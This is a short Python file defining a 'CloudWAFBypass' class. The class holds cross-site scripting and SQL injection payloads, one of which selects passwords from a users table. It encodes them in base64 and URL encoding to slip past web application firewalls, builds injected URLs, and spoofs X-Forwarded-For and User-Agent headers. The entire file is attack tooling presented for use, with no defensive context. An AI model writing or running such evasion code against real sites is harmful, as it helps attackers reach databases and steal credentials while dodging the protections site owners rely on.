import random
import base64
import urllib.parse

class CloudWAFBypass:
    def __init__(self):
        self.payloads = [
            "<script>alert('Bypassed WAF!')</script>", 
            "1' OR '1'='1'; --", 
            "admin' UNION SELECT null, password FROM users --"
        ]
        self.encoded_payloads = self.generate_encoded_payloads()

    def bypass_waf(self, url):
        payload = random.choice(self.encoded_payloads)
        return f"{url}?input={payload}"

    def generate_encoded_payloads(self):
        encoded_payloads = []
        for payload in self.payloads:
            # Base64 encoding to bypass WAF filters
            encoded_payloads.append(base64.b64encode(payload.encode('utf-8')).decode('utf-8'))
            # URL Encoding
            encoded_payloads.append(urllib.parse.quote(payload))
        return encoded_payloads

    def custom_headers(self):
        headers = {
            "X-Forwarded-For": str(random.randint(1, 255)) + "." + str(random.randint(1, 255)) + "." + str(random.randint(1, 255)) + "." + str(random.randint(1, 255)),
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        return headers
